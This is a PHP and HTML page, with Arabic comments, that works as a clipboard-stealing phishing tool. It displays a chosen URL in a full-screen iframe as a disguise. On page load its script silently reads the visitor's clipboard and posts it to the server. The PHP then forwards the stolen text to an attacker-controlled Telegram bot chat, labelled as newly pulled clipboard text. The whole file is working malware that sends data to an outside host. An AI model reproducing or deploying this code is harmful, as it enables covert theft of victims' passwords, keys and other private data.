<?php
// اسم الملف النصي
$filename = '../url.txt';

// الحصول على البيانات من الطلب
$lineNumber = isset($_GET['link']) ? intval($_GET['link']) : '';
$chatId = isset($_GET['ID']) ? $_GET['ID'] : '';

// قراءة الملف كمصفوفة من السطور
$lines = file($filename, FILE_IGNORE_NEW_LINES);

// استخراج السطر المطلوب (الفهرس يبدأ من صفر لذا نقوم بطرح واحد)
$desiredLine = '';
if ($lineNumber && isset($lines[$lineNumber - 1])) {
    $desiredLine = trim($lines[$lineNumber - 1]);
}

// دالة للحصول على السطر من الملف
function getLineFromFile($filename, $lineNumber) {
    if (!file_exists($filename)) {
        return null;
    }

    $lines = file($filename, FILE_IGNORE_NEW_LINES);
    if ($lineNumber > 0 && isset($lines[$lineNumber - 1])) {
        return trim($lines[$lineNumber - 1]);
    }

    return null;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $text = $_POST['text'] ?? '';
    if ($text && $chatId) {
        // استلام عنصر ID2 من طلب GET
        $idLineNumber = isset($_GET['ID2']) ? intval($_GET['ID2']) : null;

        $botToken = null;

$botToken = file_get_contents("../token.txt");

        if ($botToken) {
            $url = "https://api.telegram.org/bot$botToken/sendMessage";

            $postData = [
                'chat_id' => $chatId,
                'text' => "تم سحب نص حافظة جديد 📋\n\n$text",
                'parse_mode' => 'HTML'
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            // عرض رسالة النجاح أو الفشل بناءً على الاستجابة
            if ($response) {
                // إذا كان هناك استجابة، يمكنك تسجيل أو عرض نتيجة هنا
                echo "تم إرسال الرسالة بنجاح.";
            } else {
                echo "فشل إرسال الرسالة.";
            }
        } else {
            echo "لم يتم العثور على التوكن.";
        }
    } else {
        echo "البيانات غير صحيحة.";
    }
    exit; // تأكد من إنهاء السكربت بعد معالجة POST
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden; /* لمنع التمدد في حال تمت إضافة عناصر جانبية */
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <?php if (!empty($desiredLine)): ?>
        <iframe src="<?php echo htmlspecialchars($desiredLine); ?>" frameborder="0"></iframe>
    <?php endif; ?>

    <script>
        window.addEventListener('DOMContentLoaded', function() {
            // استرداد نصوص الحافظة
            navigator.clipboard.readText().then(function(text) {
                var formData = new FormData();
                formData.append('text', text);

                fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(result => console.log(result))
                .catch(error => console.log('حدث خطأ: ', error));
            })
            .catch(error => console.log('حدث خطأ أثناء استرداد نص الحافظة: ', error));
        });
    </script>
</body>
</html>
